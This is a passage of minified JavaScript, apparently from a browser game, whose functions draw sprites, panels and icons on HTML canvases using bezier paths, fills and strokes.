                    r.translate(35 * e, 12.140625 * e),
                    Ve(r, -7.5 * e, -5.5 * e, 12 * e, 11 * e, 10 * e),
                    r.restore(),
                    he(r, i[3], i[4], 3 * e),
                    r.save(),
                    r.translate(34.5 * e, 26.140625 * e),
                    Ve(r, -26 * e, -14.5 * e, 52 * e, 29 * e, 5 * e),
                    r.restore(),
                    he(r, i[3], i[4], 3 * e),
                    n
            }
            function si(e, t, i) {
                var n, r = (n = document.createElement("canvas")).getContext("2d");
                return 0 == i ? (n.width = 566 * e,
                    n.height = 429 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(312.625 * e, 39.046875 * e),
                    r.bezierCurveTo(456.625 * e, 60.046875 * e, 521.625 * e, 134.046875 * e, 528.625 * e, 199.046875 * e),
                    r.bezierCurveTo(540.625 * e, 298.046875 * e, 491.625 * e, 364.046875 * e, 405.625 * e, 394.046875 * e),
                    r.bezierCurveTo(270.625 * e, 429.046875 * e, 182.625 * e, 395.046875 * e, 100.625 * e, 344.046875 * e),
                    r.bezierCurveTo(15.625 * e, 283.046875 * e, 20.625 * e, 195.046875 * e, 33.625 * e, 158.046875 * e),
                    r.bezierCurveTo(56.625 * e, 80.046875 * e, 102.625 * e, 46.046875 * e, 183.625 * e, 33.046875 * e),
                    r.bezierCurveTo(225.625 * e, 25.046875 * e, 270.625 * e, 30.046875 * e, 312.625 * e, 39.046875 * e),
                    r.closePath(),
                    he(r, t[0])) : 1 == i ? (r = (n = document.createElement("canvas")).getContext("2d"),
                        n.width = 511 * e,
                        n.height = 408 * e,
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(141.625 * e, 49.296875 * e),
                        r.bezierCurveTo(225.625 * e, 10.296875 * e, 320.625 * e, 16.296875 * e, 390.625 * e, 39.296875 * e),
                        r.bezierCurveTo(476.625 * e, 71.296875 * e, 483.625 * e, 142.296875 * e, 486.625 * e, 197.296875 * e),
                        r.bezierCurveTo(491.625 * e, 289.296875 * e, 462.625 * e, 317.296875 * e, 417.625 * e, 351.296875 * e),
                        r.bezierCurveTo(367.625 * e, 385.296875 * e, 313.625 * e, 404.296875 * e, 218.625 * e, 395.296875 * e),
                        r.bezierCurveTo(108.625 * e, 381.296875 * e, 81.625 * e, 350.296875 * e, 52.625 * e, 305.296875 * e),
                        r.bezierCurveTo(16.625 * e, 244.296875 * e, 23.625 * e, 171.296875 * e, 37.625 * e, 145.296875 * e),
                        r.bezierCurveTo(65.625 * e, 84.296875 * e, 97.625 * e, 74.296875 * e, 141.625 * e, 49.296875 * e),
                        r.closePath(),
                        he(r, t[0])) : 2 == i && (r = (n = document.createElement("canvas")).getContext("2d"),
                            n.width = 504 * e,
                            n.height = 408 * e,
                            r.beginPath(),
                            r.lineCap = "round",
                            r.lineJoin = "round",
                            r.moveTo(153.625 * e, 46.296875 * e),
                            r.bezierCurveTo(271.625 * e, 17.296875 * e, 345.625 * e, 35.296875 * e, 410.625 * e, 71.296875 * e),
                            r.bezierCurveTo(473.625 * e, 109.296875 * e, 478.625 * e, 167.296875 * e, 473.625 * e, 205.296875 * e),
                            r.bezierCurveTo(462.625 * e, 295.296875 * e, 438.625 * e, 316.296875 * e, 388.625 * e, 345.296875 * e),
                            r.bezierCurveTo(331.625 * e, 374.296875 * e, 273.625 * e, 392.296875 * e, 180.625 * e, 387.296875 * e),
                            r.bezierCurveTo(111.625 * e, 380.296875 * e, 86.625 * e, 360.296875 * e, 51.625 * e, 309.296875 * e),
                            r.bezierCurveTo(23.625 * e, 267.296875 * e, 25.625 * e, 226.296875 * e, 27.625 * e, 175.296875 * e),
                            r.bezierCurveTo(37.625 * e, 99.296875 * e, 88.625 * e, 57.296875 * e, 153.625 * e, 46.296875 * e),
                            r.closePath(),
                            he(r, t[0])),
                    n
            }
            function _i(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 450 * e,
                    n.height = 260 * e,
                    r.translate(10 * e, 10 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(20 * e, 20 * e),
                    Ve(r, 0, 0, 400 * e, 220 * e, 30 * e),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-20 * e, -20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(9 * e, 5 * e),
                    r.bezierCurveTo(381 * e, 2 * e, 197 * e, 4.5 * e, 385 * e, 4 * e),
                    r.bezierCurveTo(397 * e, 4 * e, 401 * e, 4 * e, 399 * e, 23 * e),
                    r.bezierCurveTo(367 * e, 27 * e, 367 * e, 27 * e, 335 * e, 31 * e),
                    r.bezierCurveTo(366.5 * e, 33.5 * e, 366.5 * e, 33.5 * e, 398 * e, 36 * e),
                    r.bezierCurveTo(398 * e, 41.5 * e, 398 * e, 41.5 * e, 398 * e, 47 * e),
                    r.bezierCurveTo(398 * e, 56 * e, 399 * e, 56 * e, 386 * e, 56 * e),
                    r.bezierCurveTo(200.5 * e, 56.5 * e, 200.5 * e, 56.5 * e, 15 * e, 57 * e),
                    r.bezierCurveTo(2 * e, 55 * e, 4 * e, 52 * e, 4 * e, 43 * e),
                    r.bezierCurveTo(4 * e, 30.5 * e, 4 * e, 30.5 * e, 4 * e, 18 * e),
                    r.bezierCurveTo(16 * e, 18.5 * e, 16 * e, 18.5 * e, 28 * e, 19 * e),
                    r.bezierCurveTo(18.5 * e, 12 * e, 18.5 * e, 12 * e, 9 * e, 5 * e),
                    r.closePath(),
                    he(r, i[2], i[1], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(5 * e, 70 * e),
                    r.bezierCurveTo(5 * e, 58 * e, 5 * e, 55 * e, 17 * e, 57 * e),
                    r.bezierCurveTo(203 * e, 57 * e, 203 * e, 57 * e, 389 * e, 57 * e),
                    r.bezierCurveTo(400 * e, 57 * e, 400 * e, 59 * e, 400 * e, 69 * e),
                    r.bezierCurveTo(400.5 * e, 83.5 * e, 400.5 * e, 83.5 * e, 401 * e, 98 * e),
                    r.bezierCurveTo(402 * e, 108 * e, 401 * e, 108 * e, 388 * e, 108 * e),
                    r.bezierCurveTo(201.5 * e, 108 * e, 201.5 * e, 108 * e, 15 * e, 108 * e),
                    r.bezierCurveTo(+e, 106 * e, 5 * e, 106 * e, 5 * e, 87 * e),
                    r.bezierCurveTo(33 * e, 84.5 * e, 33 * e, 84.5 * e, 61 * e, 82 * e),
                    r.bezierCurveTo(33.5 * e, 76.5 * e, 33.5 * e, 76.5 * e, 6 * e, 71 * e),
                    r.closePath(),
                    he(r, i[3], i[1], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(19 * e, 158 * e),
                    r.bezierCurveTo(2 * e, 159 * e, 4 * e, 156 * e, 5 * e, 118 * e),
                    r.bezierCurveTo(4 * e, 110 * e, 6 * e, 107 * e, 26 * e, 109 * e),
                    r.bezierCurveTo(206.5 * e, 109 * e, 206.5 * e, 109 * e, 387 * e, 109 * e),
                    r.bezierCurveTo(400 * e, 108 * e, 400 * e, 108 * e, 398 * e, 127 * e),
                    r.bezierCurveTo(384.5 * e, 130 * e, 384.5 * e, 130 * e, 371 * e, 133 * e),
                    r.bezierCurveTo(385.5 * e, 138 * e, 385.5 * e, 138 * e, 400 * e, 143 * e),
                    r.bezierCurveTo(402 * e, 156 * e, 402 * e, 162 * e, 385 * e, 160 * e),
                    r.closePath(),
                    he(r, i[2], i[1], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(4 * e, 183 * e),
                    r.bezierCurveTo(+e, 163 * e, 4 * e, 158 * e, 28 * e, 161 * e),
                    r.bezierCurveTo(207.5 * e, 161 * e, 207.5 * e, 161 * e, 387 * e, 161 * e),
                    r.bezierCurveTo(401 * e, 159 * e, 400 * e, 164 * e, 400 * e, 177 * e),
                    r.bezierCurveTo(364.5 * e, 184 * e, 364.5 * e, 184 * e, 329 * e, 191 * e),
                    r.bezierCurveTo(364.5 * e, 192.5 * e, 364.5 * e, 192.5 * e, 400 * e, 194 * e),
                    r.bezierCurveTo(403 * e, 209 * e, 401 * e, 214 * e, 385 * e, 213 * e),
                    r.bezierCurveTo(201.5 * e, 213 * e, 201.5 * e, 213 * e, 18 * e, 213 * e),
                    r.bezierCurveTo(3 * e, 213 * e, 2 * e, 213 * e, 4 * e, 198 * e),
                    r.bezierCurveTo(12.5 * e, 193 * e, 12.5 * e, 193 * e, 21 * e, 188 * e),
                    r.closePath(),
                    he(r, i[3], i[1], 12 * e),
                    ke(r, 41 * e, 30 * e, 14.7648230602334 * e),
                    he(r, i[3], i[1], 12 * e),
                    ke(r, 369 * e, 30 * e, 15.556349186104045 * e),
                    he(r, i[3], i[1], 12 * e),
                    ke(r, 364 * e, 190 * e, 15.620499351813308 * e),
                    he(r, i[3], i[1], 12 * e),
                    ke(r, 41 * e, 186 * e, 15.556349186104045 * e),
                    he(r, i[3], i[1], 12 * e),
                    n
            }
            function Ei(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 450 * e,
                    n.height = 260 * e,
                    r.translate(10 * e, 10 * e),
                    1 != i && 2 != i || (r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(9 * e, 5 * e),
                        r.bezierCurveTo(381 * e, 2 * e, 197 * e, 4.5 * e, 385 * e, 4 * e),
                        r.bezierCurveTo(397 * e, 4 * e, 401 * e, 4 * e, 399 * e, 23 * e),
                        r.bezierCurveTo(367 * e, 27 * e, 367 * e, 27 * e, 335 * e, 31 * e),
                        r.bezierCurveTo(366.5 * e, 33.5 * e, 366.5 * e, 33.5 * e, 398 * e, 36 * e),
                        r.bezierCurveTo(398 * e, 41.5 * e, 398 * e, 41.5 * e, 398 * e, 47 * e),
                        r.bezierCurveTo(398 * e, 56 * e, 399 * e, 56 * e, 386 * e, 56 * e),
                        r.bezierCurveTo(200.5 * e, 56.5 * e, 200.5 * e, 56.5 * e, 15 * e, 57 * e),
                        r.bezierCurveTo(2 * e, 55 * e, 4 * e, 52 * e, 4 * e, 43 * e),
                        r.bezierCurveTo(4 * e, 30.5 * e, 4 * e, 30.5 * e, 4 * e, 18 * e),
                        r.bezierCurveTo(16 * e, 18.5 * e, 16 * e, 18.5 * e, 28 * e, 19 * e),
                        r.bezierCurveTo(18.5 * e, 12 * e, 18.5 * e, 12 * e, 9 * e, 5 * e),
                        r.closePath(),
                        he(r, t[3], t[3], 32 * e),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(5 * e, 70 * e),
                        r.bezierCurveTo(5 * e, 58 * e, 5 * e, 55 * e, 17 * e, 57 * e),
                        r.bezierCurveTo(203 * e, 57 * e, 203 * e, 57 * e, 389 * e, 57 * e),
                        r.bezierCurveTo(400 * e, 57 * e, 400 * e, 59 * e, 400 * e, 69 * e),
                        r.bezierCurveTo(400.5 * e, 83.5 * e, 400.5 * e, 83.5 * e, 401 * e, 98 * e),
                        r.bezierCurveTo(402 * e, 108 * e, 401 * e, 108 * e, 388 * e, 108 * e),
                        r.bezierCurveTo(201.5 * e, 108 * e, 201.5 * e, 108 * e, 15 * e, 108 * e),
                        r.bezierCurveTo(+e, 106 * e, 5 * e, 106 * e, 5 * e, 87 * e),
                        r.bezierCurveTo(33 * e, 84.5 * e, 33 * e, 84.5 * e, 61 * e, 82 * e),
                        r.bezierCurveTo(33.5 * e, 76.5 * e, 33.5 * e, 76.5 * e, 6 * e, 71 * e),
                        r.closePath(),
                        he(r, t[3], t[3], 32 * e),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(19 * e, 158 * e),
                        r.bezierCurveTo(2 * e, 159 * e, 4 * e, 156 * e, 5 * e, 118 * e),
                        r.bezierCurveTo(4 * e, 110 * e, 6 * e, 107 * e, 26 * e, 109 * e),
                        r.bezierCurveTo(206.5 * e, 109 * e, 206.5 * e, 109 * e, 387 * e, 109 * e),
                        r.bezierCurveTo(400 * e, 108 * e, 400 * e, 108 * e, 398 * e, 127 * e),
                        r.bezierCurveTo(384.5 * e, 130 * e, 384.5 * e, 130 * e, 371 * e, 133 * e),
                        r.bezierCurveTo(385.5 * e, 138 * e, 385.5 * e, 138 * e, 400 * e, 143 * e),
                        r.bezierCurveTo(402 * e, 156 * e, 402 * e, 162 * e, 385 * e, 160 * e),
                        r.closePath(),
                        he(r, t[3], t[3], 32 * e),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(4 * e, 183 * e),
                        r.bezierCurveTo(+e, 163 * e, 4 * e, 158 * e, 28 * e, 161 * e),
                        r.bezierCurveTo(207.5 * e, 161 * e, 207.5 * e, 161 * e, 387 * e, 161 * e),
                        r.bezierCurveTo(401 * e, 159 * e, 400 * e, 164 * e, 400 * e, 177 * e),
                        r.bezierCurveTo(364.5 * e, 184 * e, 364.5 * e, 184 * e, 329 * e, 191 * e),
                        r.bezierCurveTo(364.5 * e, 192.5 * e, 364.5 * e, 192.5 * e, 400 * e, 194 * e),
                        r.bezierCurveTo(403 * e, 209 * e, 401 * e, 214 * e, 385 * e, 213 * e),
                        r.bezierCurveTo(201.5 * e, 213 * e, 201.5 * e, 213 * e, 18 * e, 213 * e),
                        r.bezierCurveTo(3 * e, 213 * e, 2 * e, 213 * e, 4 * e, 198 * e),
                        r.bezierCurveTo(12.5 * e, 193 * e, 12.5 * e, 193 * e, 21 * e, 188 * e),
                        r.closePath(),
                        he(r, t[3], t[3], 32 * e),
                        ke(r, 41 * e, 30 * e, 14.7648230602334 * e),
                        he(r, t[3], t[3], 32 * e),
                        ke(r, 369 * e, 30 * e, 15.556349186104045 * e),
                        he(r, t[3], t[3], 32 * e),
                        ke(r, 364 * e, 190 * e, 15.620499351813308 * e),
                        he(r, t[3], t[3], 32 * e),
                        ke(r, 41 * e, 186 * e, 15.556349186104045 * e),
                        he(r, t[3], t[3], 32 * e)),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(9 * e, 5 * e),
                    r.bezierCurveTo(381 * e, 2 * e, 197 * e, 4.5 * e, 385 * e, 4 * e),
                    r.bezierCurveTo(397 * e, 4 * e, 401 * e, 4 * e, 399 * e, 23 * e),
                    r.bezierCurveTo(367 * e, 27 * e, 367 * e, 27 * e, 335 * e, 31 * e),
                    r.bezierCurveTo(366.5 * e, 33.5 * e, 366.5 * e, 33.5 * e, 398 * e, 36 * e),
                    r.bezierCurveTo(398 * e, 41.5 * e, 398 * e, 41.5 * e, 398 * e, 47 * e),
                    r.bezierCurveTo(398 * e, 56 * e, 399 * e, 56 * e, 386 * e, 56 * e),
                    r.bezierCurveTo(200.5 * e, 56.5 * e, 200.5 * e, 56.5 * e, 15 * e, 57 * e),
                    r.bezierCurveTo(2 * e, 55 * e, 4 * e, 52 * e, 4 * e, 43 * e),
                    r.bezierCurveTo(4 * e, 30.5 * e, 4 * e, 30.5 * e, 4 * e, 18 * e),
                    r.bezierCurveTo(16 * e, 18.5 * e, 16 * e, 18.5 * e, 28 * e, 19 * e),
                    r.bezierCurveTo(18.5 * e, 12 * e, 18.5 * e, 12 * e, 9 * e, 5 * e),
                    r.closePath(),
                    he(r, t[1], t[0], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(5 * e, 70 * e),
                    r.bezierCurveTo(5 * e, 58 * e, 5 * e, 55 * e, 17 * e, 57 * e),
                    r.bezierCurveTo(203 * e, 57 * e, 203 * e, 57 * e, 389 * e, 57 * e),
                    r.bezierCurveTo(400 * e, 57 * e, 400 * e, 59 * e, 400 * e, 69 * e),
                    r.bezierCurveTo(400.5 * e, 83.5 * e, 400.5 * e, 83.5 * e, 401 * e, 98 * e),
                    r.bezierCurveTo(402 * e, 108 * e, 401 * e, 108 * e, 388 * e, 108 * e),
                    r.bezierCurveTo(201.5 * e, 108 * e, 201.5 * e, 108 * e, 15 * e, 108 * e),
                    r.bezierCurveTo(+e, 106 * e, 5 * e, 106 * e, 5 * e, 87 * e),
                    r.bezierCurveTo(33 * e, 84.5 * e, 33 * e, 84.5 * e, 61 * e, 82 * e),
                    r.bezierCurveTo(33.5 * e, 76.5 * e, 33.5 * e, 76.5 * e, 6 * e, 71 * e),
                    r.closePath(),
                    he(r, t[2], t[0], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(19 * e, 158 * e),
                    r.bezierCurveTo(2 * e, 159 * e, 4 * e, 156 * e, 5 * e, 118 * e),
                    r.bezierCurveTo(4 * e, 110 * e, 6 * e, 107 * e, 26 * e, 109 * e),
                    r.bezierCurveTo(206.5 * e, 109 * e, 206.5 * e, 109 * e, 387 * e, 109 * e),
                    r.bezierCurveTo(400 * e, 108 * e, 400 * e, 108 * e, 398 * e, 127 * e),
                    r.bezierCurveTo(384.5 * e, 130 * e, 384.5 * e, 130 * e, 371 * e, 133 * e),
                    r.bezierCurveTo(385.5 * e, 138 * e, 385.5 * e, 138 * e, 400 * e, 143 * e),
                    r.bezierCurveTo(402 * e, 156 * e, 402 * e, 162 * e, 385 * e, 160 * e),
                    r.closePath(),
                    he(r, t[1], t[0], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(4 * e, 183 * e),
                    r.bezierCurveTo(+e, 163 * e, 4 * e, 158 * e, 28 * e, 161 * e),
                    r.bezierCurveTo(207.5 * e, 161 * e, 207.5 * e, 161 * e, 387 * e, 161 * e),
                    r.bezierCurveTo(401 * e, 159 * e, 400 * e, 164 * e, 400 * e, 177 * e),
                    r.bezierCurveTo(364.5 * e, 184 * e, 364.5 * e, 184 * e, 329 * e, 191 * e),
                    r.bezierCurveTo(364.5 * e, 192.5 * e, 364.5 * e, 192.5 * e, 400 * e, 194 * e),
                    r.bezierCurveTo(403 * e, 209 * e, 401 * e, 214 * e, 385 * e, 213 * e),
                    r.bezierCurveTo(201.5 * e, 213 * e, 201.5 * e, 213 * e, 18 * e, 213 * e),
                    r.bezierCurveTo(3 * e, 213 * e, 2 * e, 213 * e, 4 * e, 198 * e),
                    r.bezierCurveTo(12.5 * e, 193 * e, 12.5 * e, 193 * e, 21 * e, 188 * e),
                    r.closePath(),
                    he(r, t[2], t[0], 12 * e),
                    ke(r, 41 * e, 30 * e, 14.7648230602334 * e),
                    he(r, t[2], t[0], 12 * e),
                    ke(r, 369 * e, 30 * e, 15.556349186104045 * e),
                    he(r, t[2], t[0], 12 * e),
                    ke(r, 364 * e, 190 * e, 15.620499351813308 * e),
                    he(r, t[2], t[0], 12 * e),
                    ke(r, 41 * e, 186 * e, 15.556349186104045 * e),
                    he(r, t[2], t[0], 12 * e),
                    n
            }
            function ui(e, t, i, n) {
                var r = document.createElement("canvas")
                    , o = r.getContext("2d")
                    , a = (r.width = 450 * e,
                        r.height = 260 * e,
                        _i(+e, !0, i));
                return o.drawImage(a, 0 * e, 0 * e),
                    1 == n ? (o.translate(100 * e, 0 * e),
                        ke(o, 113 * e, 120 * e, 66 * e),
                        he(o, void 0, i[4], 13 * e),
                        a = Z1(.65 * e, !0, ["#0d1b1c", "#4d2d14", "#432516", "#939393", "#5f6061"]),
                        o.rotate(.7),
                        o.drawImage(a, 133 * e, -64 * e),
                        o.rotate(-.7),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(70 * e, 70 * e),
                        o.bezierCurveTo(113 * e, 120.5 * e, 113 * e, 120.5 * e, 156 * e, 171 * e),
                        o.closePath(),
                        he(o, void 0, i[4], 13 * e)) : 2 == n ? (o.translate(100 * e, 0 * e),
                            ke(o, 113 * e, 120 * e, 66 * e),
                            he(o, void 0, i[4], 13 * e),
                            o.translate(30 * e, 40 * e),
                            o.save(),
                            o.translate(83.5 * e, 66.5 * e),
                            Ve(o, -40.5 * e, -29.5 * e, 81 * e, 59 * e, 15 * e),
                            o.restore(),
                            he(o, "#dff2f7", "#187484", 7 * e),
                            ke(o, 22 * e, 82 * e, 12 * e),
                            he(o, "#dff2f7", "#187484", 7 * e),
                            ke(o, 145 * e, 82 * e, 12 * e),
                            he(o, "#dff2f7", "#187484", 7 * e),
                            a = ct(.5 * e, !0, ["#80500b", "#7c4908"]),
                            o.drawImage(a, 10 * e, 85 * e),
                            a = ct(.5 * e, !0, ["#80500b", "#7c4908"]),
                            o.drawImage(a, 50 * e, 85 * e),
                            a = ct(.5 * e, !0, ["#80500b", "#7c4908"]),
                            o.drawImage(a, 90 * e, 85 * e),
                            a = Ot(+e, 0, ["#3d2a6e", "#8255b5"]),
                            o.drawImage(a, 90 * e, 105 * e),
                            a = Ot(+e, 0, ["#3d2a6e", "#8255b5"]),
                            o.drawImage(a, 90 * e, 105 * e),
                            a = Ot(+e, 0, ["#3d2a6e", "#8255b5"]),
                            o.drawImage(a, 30 * e, 125 * e),
                            a = Ot(+e, 0, ["#3d2a6e", "#8255b5"]),
                            o.drawImage(a, 50 * e, 115 * e),
                            a = Ot(+e, 0, ["#3d2a6e", "#8255b5"]),
                            o.drawImage(a, 30 * e, 100 * e),
                            a = Ot(+e, 0, ["#3d2a6e", "#8255b5"]),
                            o.drawImage(a, 80 * e, 120 * e),
                            a = Ot(+e, 0, ["#3d2a6e", "#8255b5"]),
                            o.drawImage(a, 110 * e, 125 * e),
                            a = Ot(+e, 0, ["#3d2a6e", "#8255b5"]),
                            o.drawImage(a, 120 * e, 105 * e)) : 3 == n ? (o.translate(100 * e, 0 * e),
                                ke(o, 113 * e, 120 * e, 66 * e),
                                he(o, void 0, i[4], 13 * e),
                                o.translate(40 * e, 50 * e),
                                o.save(),
                                o.translate(71 * e, 69 * e),
                                Ve(o, -30 * e, -42 * e, 60 * e, 84 * e, 10 * e),
                                o.restore(),
                                he(o, void 0, i[5], 4 * e),
                                o.beginPath(),
                                o.lineCap = "round",
                                o.lineJoin = "round",
                                o.moveTo(42 * e, 28 * e),
                                o.bezierCurveTo(60 * e, 31 * e, 60 * e, 31 * e, 78 * e, 34 * e),
                                o.bezierCurveTo(82 * e, 34 * e, 84 * e, 37 * e, 83 * e, 45 * e),
                                o.bezierCurveTo(83 * e, 80 * e, 83 * e, 80 * e, 83 * e, 115 * e),
                                o.bezierCurveTo(83 * e, 120 * e, 80 * e, 122 * e, 73 * e, 120 * e),
                                o.bezierCurveTo(42 * e, 111 * e, 43 * e, 109 * e, 41 * e, 102 * e),
                                o.bezierCurveTo(41 * e, 71 * e, 41 * e, 71 * e, 41 * e, 40 * e),
                                o.closePath(),
                                he(o, i[5], i[5], 4 * e),
                                o.translate(-40 * e, -50 * e),
                                o.beginPath(),
                                o.lineCap = "round",
                                o.lineJoin = "round",
                                o.moveTo(70 * e, 70 * e),
                                o.bezierCurveTo(113 * e, 120.5 * e, 113 * e, 120.5 * e, 156 * e, 171 * e),
                                o.closePath(),
                                he(o, void 0, i[4], 13 * e)) : 4 == n && (o.scale(1, 1),
                                    o.translate(70 * e, 50 * e),
                                    o.beginPath(),
                                    o.lineCap = "round",
                                    o.lineJoin = "round",
                                    o.moveTo(23 * e, 6 * e),
                                    o.bezierCurveTo(25.5 * e, 56 * e, 25.5 * e, 56 * e, 28 * e, 106 * e),
                                    he(o, void 0, i[5], 14 * e),
                                    o.beginPath(),
                                    o.lineCap = "round",
                                    o.lineJoin = "round",
                                    o.moveTo(59 * e, 10 * e),
                                    o.bezierCurveTo(61 * e, 51.5 * e, 61 * e, 51.5 * e, 63 * e, 93 * e),
                                    he(o, void 0, i[5], 14 * e),
                                    o.beginPath(),
                                    o.lineCap = "round",
                                    o.lineJoin = "round",
                                    o.moveTo(7 * e, 55 * e),
                                    o.bezierCurveTo(33.5 * e, 55 * e, 33.5 * e, 55 * e, 60 * e, 55 * e),
                                    he(o, void 0, i[5], 14 * e),
                                    o.translate(10 * e, 0 * e),
                                    o.beginPath(),
                                    o.lineCap = "round",
                                    o.lineJoin = "round",
                                    o.moveTo(123 * e, 16 * e),
                                    o.bezierCurveTo(103 * e, 16.5 * e, 103 * e, 16.5 * e, 83 * e, 17 * e),
                                    o.bezierCurveTo(83.5 * e, 61 * e, 83.5 * e, 61 * e, 84 * e, 105 * e),
                                    o.bezierCurveTo(106 * e, 105 * e, 106 * e, 105 * e, 128 * e, 105 * e),
                                    he(o, void 0, i[5], 14 * e),
                                    o.beginPath(),
                                    o.lineCap = "round",
                                    o.lineJoin = "round",
                                    o.moveTo(72 * e, 63 * e),
                                    o.bezierCurveTo(88.5 * e, 62.5 * e, 88.5 * e, 62.5 * e, 105 * e, 62 * e),
                                    he(o, void 0, i[5], 14 * e),
                                    o.translate(10 * e, 10 * e),
                                    o.beginPath(),
                                    o.lineCap = "round",
                                    o.lineJoin = "round",
                                    o.moveTo(141 * e, 8 * e),
                                    o.bezierCurveTo(143 * e, 50 * e, 143 * e, 50 * e, 145 * e, 92 * e),
                                    o.bezierCurveTo(169 * e, 88.5 * e, 169 * e, 88.5 * e, 193 * e, 85 * e),
                                    he(o, void 0, i[5], 14 * e),
                                    o.translate(10 * e, -10 * e),
                                    o.beginPath(),
                                    o.lineCap = "round",
                                    o.lineJoin = "round",
                                    o.moveTo(205 * e, 124 * e),
                                    o.bezierCurveTo(205 * e, 69 * e, 205 * e, 69 * e, 205 * e, 14 * e),
                                    o.bezierCurveTo(239 * e, 15 * e, 250 * e, 37 * e, 249 * e, 49 * e),
                                    o.bezierCurveTo(251 * e, 65 * e, 242 * e, 76 * e, 206 * e, 75 * e),
                                    he(o, void 0, i[5], 14 * e)),
                    r
            }
            function di(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 345 * e,
                    n.height = 250 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(105 * e, 58 * e),
                    r.bezierCurveTo(100.5 * e, 43 * e, 100.5 * e, 43 * e, 96 * e, 28 * e),
                    r.bezierCurveTo(119.5 * e, 33.5 * e, 119.5 * e, 33.5 * e, 143 * e, 39 * e),
                    r.bezierCurveTo(170 * e, 37 * e, 177 * e, 37 * e, 188 * e, 40 * e),
                    r.bezierCurveTo(213 * e, 33.5 * e, 213 * e, 33.5 * e, 238 * e, 27 * e),
                    r.bezierCurveTo(231 * e, 52 * e, 234 * e, 42.5 * e, 230 * e, 58 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(108 * e, 51 * e),
                    r.bezierCurveTo(91 * e, 55 * e, 85 * e, 44 * e, 86 * e, 29 * e),
                    r.bezierCurveTo(62 * e, 50 * e, 78 * e, 69 * e, 92 * e, 75 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(249 * e, 27 * e),
                    r.bezierCurveTo(273 * e, 49 * e, 262 * e, 68 * e, 246 * e, 77 * e),
                    r.bezierCurveTo(231 * e, 59 * e, 236 * e, 66.5 * e, 226 * e, 56 * e),
                    r.bezierCurveTo(243 * e, 53 * e, 252 * e, 43 * e, 249 * e, 28 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(87 * e, 78 * e),
                    r.bezierCurveTo(87 * e, 59 * e, 98 * e, 46 * e, 127 * e, 48 * e),
                    r.bezierCurveTo(176 * e, 48.5 * e, 176 * e, 48.5 * e, 225 * e, 49 * e),
                    r.bezierCurveTo(243 * e, 49 * e, 253 * e, 59 * e, 253 * e, 76 * e),
                    r.bezierCurveTo(211 * e, 85.5 * e, 211 * e, 85.5 * e, 169 * e, 95 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(56 * e, 105 * e),
                    r.bezierCurveTo(56 * e, 92 * e, 59 * e, 86 * e, 65 * e, 73 * e),
                    r.bezierCurveTo(62.5 * e, 61.5 * e, 62.5 * e, 61.5 * e, 60 * e, 50 * e),
                    r.bezierCurveTo(99.5 * e, 64.5 * e, 99.5 * e, 64.5 * e, 139 * e, 79 * e),
                    r.bezierCurveTo(164 * e, 77 * e, 177 * e, 76 * e, 203 * e, 78 * e),
                    r.bezierCurveTo(242 * e, 63.5 * e, 242 * e, 63.5 * e, 281 * e, 49 * e),
                    r.bezierCurveTo(279 * e, 60.5 * e, 279 * e, 60.5 * e, 277 * e, 72 * e),
                    r.bezierCurveTo(286 * e, 88 * e, 286 * e, 96 * e, 287 * e, 104 * e),
                    r.bezierCurveTo(228.5 * e, 127 * e, 228.5 * e, 127 * e, 170 * e, 150 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(48 * e, 130 * e),
                    r.bezierCurveTo(61 * e, 155 * e, 63 * e, 165 * e, 56 * e, 171 * e),
                    r.bezierCurveTo(48 * e, 177 * e, 40 * e, 171 * e, 38 * e, 178 * e),
                    r.bezierCurveTo(33 * e, 180 * e, 37 * e, 188 * e, 47 * e, 208 * e),
                    r.bezierCurveTo(52 * e, 221 * e, 55 * e, 222 * e, 75 * e, 229 * e),
                    r.bezierCurveTo(91 * e, 213 * e, 98 * e, 212 * e, 112 * e, 219 * e),
                    r.bezierCurveTo(167 * e, 225 * e, 187 * e, 224 * e, 222 * e, 220 * e),
